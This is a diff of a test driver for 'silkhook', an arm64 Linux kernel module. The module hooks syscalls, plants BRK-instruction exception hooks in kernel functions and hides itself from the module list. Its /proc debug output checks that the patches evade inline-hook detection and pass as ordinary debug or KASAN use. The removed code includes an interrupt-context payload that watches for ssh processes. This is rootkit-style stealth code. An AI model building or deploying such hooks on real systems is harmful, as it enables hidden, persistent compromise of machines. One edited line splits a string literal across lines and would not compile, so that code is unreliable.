@@ -11,8 +11,6 @@
 #include <linux/workqueue.h>
 #include <linux/proc_fs.h>
 #include <linux/seq_file.h>
-#include <linux/sched.h>
-#include <linux/string.h>
 #include <asm/unistd.h>
 
 #include "include/silkhook.h"
@@ -22,18 +20,16 @@
 #include "platform/kernel/svc.h"
 #include "platform/kernel/shadow.h"
 #include "platform/kernel/elb.h"
-#include "platform/kernel/ich.h"
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("vmsplit");
-MODULE_DESCRIPTION("silkhook test");
+MODULE_DESCRIPTION("silkhook test0000002992929292");
 
 
 static struct delayed_work setup_work;
 static struct silkhook_svc_hook   __svc_hook;
 static struct silkhook_hidden_mod __hidden;
 static struct silkhook_elb_hook   __elb_hook;
-static struct silkhook_ich_hook   __ich_hook;
 static unsigned int               __trigger_count;
 
 
@@ -47,78 +43,11 @@ asmlinkage long hooked_getuid(void)
 {
     __trigger_count++;
     if (__trigger_count % 10 == 1)
-        pr_info("silkhook: [svc] getuid called !!  count=%u\n", __trigger_count);
+        pr_info("silkhook: [svc] getuid called !! count=%u\n", __trigger_count);
 
     return current_uid().val;
 }
 
-
-/* ─────────────────────────────────────────────────────────────────────────────
- * elb hook test (exception bounce)
- * ───────────────────────────────────────────────────────────────────────────── */
-
-static unsigned int __elb_count;
-static int __elb_stack_dumped = 0;
-
-static void elb_test_handler(struct pt_regs *regs, struct silkhook_elb_hook *ctx)
-{
-    __elb_count++;
-
-    if (!__elb_stack_dumped)
-    {
-        __elb_stack_dumped = 1;
-        pr_info("silkhook: --------------------------------------------\n");
-        pr_info("silkhook:   [elb]  callstack proof\n");
-        pr_info("silkhook:   [elb]  proving hook runs in exception path:\n");
-        pr_info("silkhook: --------------------------------------------\n");
-        dump_stack();
-        pr_info("silkhook: --------------------------------------------\n");
-    }
-
-    if (__elb_count % 100 == 1)
-        pr_info("silkhook: [elb] exception bounce !! pc=%lx count=%u\n",
-                instruction_pointer(regs), __elb_count);
-}
-
-
-/* ─────────────────────────────────────────────────────────────────────────────
- * ich hook test
- *
- * runs from hardirq ctx on timer interrupt
- * fires every ~1 sec (coalesce=256 @ 250Hz)
- * ───────────────────────────────────────────────────────────────────────────── */
-
-static unsigned int __ich_exec_count;
-
-static void ich_test_payload(struct pt_regs *regs, struct silkhook_ich_hook *ctx)
-{
-    struct task_struct *task = current;
-
-    __ich_exec_count++;
-
-    /*  we're in hardirq ctx,  we can inspect any running task
-     *  this fires regardless of what userspace is doing in the moment  */
-    if (__ich_exec_count % 10 == 1)
-    {
-        pr_info("silkhook: [ich] tick !! cpu=%u pid=%d comm=%s\n",
-                smp_processor_id(),
-                task->pid,
-                task->comm);
-    }
-
-    /*  e.g.: detect aspecific process
-     *        here i attempt watching for ssh  */
-    if (strncmp(task->comm, "ssh", 3) == 0)
-    {
-        if (__ich_exec_count % 50 == 1)
-            pr_info("silkhook: [ich] spotted ssh !! pid=%d\n", task->pid);
-    }
-}
-
-
-/* ─────────────────────────────────────────────────────────────────────────────
- * /proc/silkhook_debug
- * ───────────────────────────────────────────────────────────────────────────── */
 
 static int silkhook__debug_show(struct seq_file *m, void *v)
 {
@@ -133,16 +62,19 @@ static int silkhook__debug_show(struct seq_file *m, void *v)
 
     if (!__elb_hook.installed)
     {
-        seq_puts(m, "elb hook NOT installed\n");
+        seq_puts(m, "silkhook: elb hook NOT installed\n");
         return 0;
     }
 
-    hook_site = (uint32_t *)__elb_hook.targ;
+    hook_site = (uint32_t *) __elb_hook.targ;
     instr = hook_site[0];
 
+    /* ─────────────────────────────────────────────────────────────────────
+     * debug 1:  4 byte single instr patch
+     * ───────────────────────────────────────────────────────────────────── */
     seq_puts(m, "[1] single instr patch\n");
     seq_puts(m, "    -------------------------------------------------------\n");
-    seq_printf(m, "    hook addr:     %px\n", hook_site);
+    seq_printf(m, "    hook addr:     %px\n",  hook_site);
     seq_printf(m, "    curr instr:    %08x\n", instr);
     seq_printf(m, "    expected brk:  %08x\n", SILKHOOK_BRK_INSTR);
     seq_printf(m, "    orig instr:    %08x\n", __elb_hook.orig_instr);
@@ -151,8 +83,12 @@ static int silkhook__debug_show(struct seq_file *m, void *v)
     if (instr == SILKHOOK_BRK_INSTR)
         seq_puts(m, "    result:        GOOD - only 4 bytes modified!!\n\n");
     else
-        seq_puts(m, "    result:        BAD\n\n");
+        seq_puts(m, "    result:        BAD  - unexpected instr!!\n\n");
 
+
+    /* ─────────────────────────────────────────────────────────────────────
+     * debug 2:  no jump seqs visible
+     * ───────────────────────────────────────────────────────────────────── */
     seq_puts(m, "[2] no jump sequences\n");
     seq_puts(m, "    -------------------------------------------------------\n");
     seq_puts(m, "    scanning for inline hook sigs...\n");
@@ -160,16 +96,27 @@ static int silkhook__debug_show(struct seq_file *m, void *v)
     for (i = 0; i < 5; i++)
     {
         uint32_t ins = hook_site[i];
+        /*  movz xN, #imm = 0xD28.....  */
         if ((ins & 0xFF800000) == 0xD2800000)
+        {
             has_movz++;
-        /*  check upper 9 bits instead  */
-        if ((ins >> 23) == (0xF28 >> 1) ||   /*  movk lsl #0   */
-            (ins >> 23) == (0xF2A >> 1) ||   /*  movk lsl #16  */
-            (ins >> 23) == (0xF2C >> 1) ||   /*  movk lsl #32  */
-            (ins >> 23) == (0xF2E >> 1))     /*  movk lsl #48  */
+            seq_printf(m, "      [!]  movz @ +%02x: %08x\n", i * 4, ins);
+        }
+        /*  movk xN, #imm = 0xF2......  */
+        if ((ins & 0xFF800000) == 0xF2800000 ||
+            (ins & 0xFF800000) == 0xF2A00000 ||
+            (ins & 0xFF800000) == 0xF2C00000 ||
+            (ins & 0xFF800000) == 0xF2E00000)
+        {
             has_movz++;
+            seq_printf(m, "      [!] movk @ +%02x:  %08x\n", i * 4, ins);
+        }
+        /*  br xN = 0xD61F0...  */
         if ((ins & 0xFFFFFC1F) == 0xD61F0000)
+        {
             has_br++;
+            seq_printf(m, "      [!] br   @ +%02x:  %08x\n", i * 4, ins);
+        }
     }
 
     seq_printf(m, "    movz/movk spotted: %d\n", has_movz);
@@ -178,8 +125,11 @@ static int silkhook__debug_show(struct seq_file *m, void *v)
     if (has_movz < 2 && has_br == 0)
         seq_puts(m, "    result:          GOOD - no shellcode pattern!!\n\n");
     else
-        seq_puts(m, "    result:          BAD - jump seq detected\n\n");
+        seq_puts(m, "    result:          BAD  - jump sequence spotted!!\n\n");
 
+    /* ─────────────────────────────────────────────────────────────────────
+     * debug 3:  brk instr analysis
+     * ───────────────────────────────────────────────────────────────────── */
     seq_puts(m, "[3] brk instr analysis\n");
     seq_puts(m, "    -------------------------------------------------------\n");
 
@@ -189,10 +139,14 @@ static int silkhook__debug_show(struct seq_file *m, void *v)
         seq_printf(m, "    encoding:      brk #0x%04x\n", imm);
         seq_printf(m, "    opcode mask:   %08x & FFE0001F = D4200000 [GOOD]\n", instr);
         seq_puts(m, "    result:        GOOD - valid brk instr\n\n");
-    } else {
-        seq_puts(m, "    result:        BAD\n\n");
+    }
+    else {
+        seq_puts(m, "    result:        BAD  - not a brk instr\n\n");
     }
 
+    /* ─────────────────────────────────────────────────────────────────────
+     * debug 4:  brk integrity  (kernel ctx)
+     * ───────────────────────────────────────────────────────────────────── */
     seq_puts(m, "[4] brk integrity\n");
     seq_puts(m, "    -------------------------------------------------------\n");
     seq_puts(m, "    kernel brk imm vals:\n");
@@ -206,6 +160,9 @@ static int silkhook__debug_show(struct seq_file *m, void *v)
     seq_printf(m, "      0x%04x       silkhook  <--  (our hook)\n", SILKHOOK_BRK_IMM);
     seq_puts(m, "    result:        GOOD - should look like debug / kasan use\n\n");
 
+    /* ─────────────────────────────────────────────────────────────────────
+     * debug 5:  mem dump
+     * ───────────────────────────────────────────────────────────────────── */
     seq_puts(m, "[5] mem dump @ hook-site\n");
     seq_puts(m, "    -------------------------------------------------------\n");
     for (i = 0; i < 8; i++)
@@ -217,6 +174,9 @@ static int silkhook__debug_show(struct seq_file *m, void *v)
             seq_puts(m, "\n");
     }
 
+    /* ─────────────────────────────────────────────────────────────────────
+     * debug 6:  cmp with inline hook
+     * ───────────────────────────────────────────────────────────────────── */
     seq_puts(m, "\n[6] compare:  elb vs inline hook\n");
     seq_puts(m, "    -------------------------------------------------------\n");
     seq_puts(m, "    technique        bytes   pattern             detectable\n");
@@ -241,61 +201,31 @@ static const struct proc_ops silkhook_debug_ops = {
     .proc_release = single_release,
 };
 
-
 /* ─────────────────────────────────────────────────────────────────────────────
- * /proc/silkhook_ich  (stats n stuff)
+ * elb hook test  (exception bounce)
  * ───────────────────────────────────────────────────────────────────────────── */
 
-static int silkhook__ich_debug_show(struct seq_file *m, void *v)
+static unsigned int __elb_count;
+
+static void elb_test_handler(struct pt_regs *regs, struct silkhook_elb_hook *ctx)
 {
-    uint64_t exec, skip, cycles;
+    __elb_count++;
 
-    seq_puts(m, "┌─────────────────────────────────────────┐\n");
-    seq_puts(m, "│           silkhook ich stats            │\n");
-    seq_puts(m, "└─────────────────────────────────────────┘\n\n");
-
-    if (!__ich_hook.installed)
+    /*  dump callstack on  1st invoke as proof  */
+    if (__elb_count == 1)
     {
-        seq_puts(m, "[!]  ich hook NOT installed...\n");
-        return 0;
+        pr_info("silkhook: --------------------------------------------\n");
+        pr_info("silkhook:   [elb]  callstack proof\n");
+        pr_info("silkhook:   [elb]  proving hook runs in exception path:\n");
+        pr_info("silkhook: --------------------------------------------\n");
+        dump_stack();
+        pr_info("silkhook: --------------------------------------------\n");
     }
 
-    silkhook__ich_get_stats(&__ich_hook, &exec, &skip, &cycles);
-
-    seq_puts(m, "┌─────────────────────────────────────────┐\n");
-    seq_puts(m, "│ config                                  │\n");
-    seq_puts(m, "├─────────────────────────────────────────┤\n");
-    seq_printf(m, "│ targ:     %px              │\n",             __ich_hook.targ);
-    seq_printf(m, "│ orig instr: %08x                    │\n",   __ich_hook.orig_instr);
-    seq_printf(m, "│ coalesce:   every %4u irqs             │\n", __ich_hook.coalesce_n);
-    seq_printf(m, "│ jitter:     %u-%u cycles                │\n",
-               __ich_hook.jitter_min, __ich_hook.jitter_max);
-    seq_puts(m, "└─────────────────────────────────────────┘\n\n");
-
-    seq_puts(m, "┌─────────────────────────────────────────┐\n");
-    seq_puts(m, "│ runtime statistics                      │\n");
-    seq_puts(m, "├─────────────────────────────────────────┤\n");
-    seq_printf(m, "│ execs: %8llu                         │\n", exec);
-    seq_printf(m, "│ skipped:    %8llu                    │\n", skip);
-    seq_printf(m, "│ total cyc:  %8llu                    │\n", cycles);
-    if (exec > 0)
-        seq_printf(m, "│ avg cycles: %8llu                    │\n", cycles / exec);
-    seq_puts(m, "└─────────────────────────────────────────┘\n\n");
-
-    return 0;
+    if (__elb_count % 100 == 1)
+        pr_info("silkhook: [elb] exception bounce !! pc=%lx count=%u\n",
+                instruction_pointer(regs), __elb_count);
 }
-
-static int silkhook__ich_debug_open(struct inode *inode, struct file *file)
-{
-    return single_open(file, silkhook__ich_debug_show, NULL);
-}
-
-static const struct proc_ops silkhook_ich_debug_ops = {
-    .proc_open    = silkhook__ich_debug_open,
-    .proc_read    = seq_read,
-    .proc_lseek   = seq_lseek,
-    .proc_release = single_release,
-};
 
 
 /* ─────────────────────────────────────────────────────────────────────────────
@@ -307,12 +237,11 @@ static void do_silkhook_setup(struct work_struct *work)
     int r;
     void *targ;
 
-    pr_info("silkhook: setup started !!!\n");
+    pr_info("silkhook: setup started !!
+        !\n");
 
-    if (silkhook_ksyms_init() != 0)
-        return;
-    if (silkhook_mem_init() != 0)
-        return;
+    if (silkhook_ksyms_init() != 0) return;
+    if (silkhook_mem_init() != 0) return;
 
     /*  svc hook  */
     r = silkhook__svc_init(&__svc_hook);
@@ -329,7 +258,7 @@ static void do_silkhook_setup(struct work_struct *work)
         return;
     }
 
-    /*  elb hook  */
+    /*  elb hook hook..something that gets called frequently  */
     r = silkhook__elb_init();
     if (r != SILKHOOK_OK)
     {
@@ -337,6 +266,8 @@ static void do_silkhook_setup(struct work_struct *work)
         goto skip_elb;
     }
 
+    /*  e.g.: hook the entry of some kernel funct
+     *  NOTE: something that doesn't cause recursion!!!  */
     targ = silkhook_ksym("__arm64_sys_getpid");
     if (targ)
     {
@@ -347,34 +278,6 @@ static void do_silkhook_setup(struct work_struct *work)
     }
 
 skip_elb:
-
-    r = silkhook__ich_init();
-    if (r != SILKHOOK_OK)
-    {
-        pr_err("silkhook: ich init failure: %d\n", r);
-        goto skip_ich;
-    }
-
-    {
-        struct silkhook_ich_cfg ich_cfg = {
-            .coalesce_n   = 16,    /*  every 16th irq  */
-            .jitter_min   = 10,
-            .jitter_max   = 50,
-            .payload      = ich_test_payload,
-            .payload_ctx  = NULL,
-        };
-
-        r = silkhook__ich_install(&__ich_hook, &ich_cfg);
-        if (r == SILKHOOK_OK)
-        {
-            proc_create("silkhook_ich", 0444, NULL, &silkhook_ich_debug_ops);
-            pr_info("silkhook: ich ready !!!\n");
-        } else {
-            pr_err("silkhook: ich install failure: %d\n", r);
-        }
-    }
-
-skip_ich:
     silkhook__hide_mod(THIS_MODULE, &__hidden);
 
     pr_info("silkhook: setup complete !!!\n");
@@ -390,12 +293,9 @@ static int __init silkhook_mod_init(void)
 
 static void __exit silkhook_mod_exit(void)
 {
-    remove_proc_entry("silkhook_ich", NULL);
     remove_proc_entry("silkhook_debug", NULL);
     cancel_delayed_work_sync(&setup_work);
     silkhook__unhide_mod(&__hidden);
-    silkhook__ich_remove(&__ich_hook);
-    silkhook__ich_exit();
     silkhook__elb_remove(&__elb_hook);
     silkhook__elb_exit();
     silkhook__svc_remove(&__svc_hook);
